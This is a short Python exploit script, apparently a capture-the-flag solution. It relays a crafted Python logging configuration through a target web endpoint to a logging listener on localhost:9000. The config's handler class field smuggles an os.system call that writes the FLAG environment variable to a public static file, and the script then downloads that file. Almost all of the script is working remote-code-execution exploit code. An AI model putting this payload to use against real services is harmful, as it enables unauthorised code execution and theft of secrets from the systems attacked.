import requests
import struct
import sys

# 1. template from https://docs.python.org/3/howto/logging.html
config = b"""
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=INFO
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('echo $FLAG > ./static/win.txt')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
"""

HOST = 'localhost'
PORT = 9000
length = struct.pack('>L', len(config))

r = requests.post(f"{sys.argv[1]}", files={
    "target": "localhost:9000",
    "data": length + config
})

print(r.text)

print(requests.get(f"{sys.argv[1]}/static/win.txt").text)
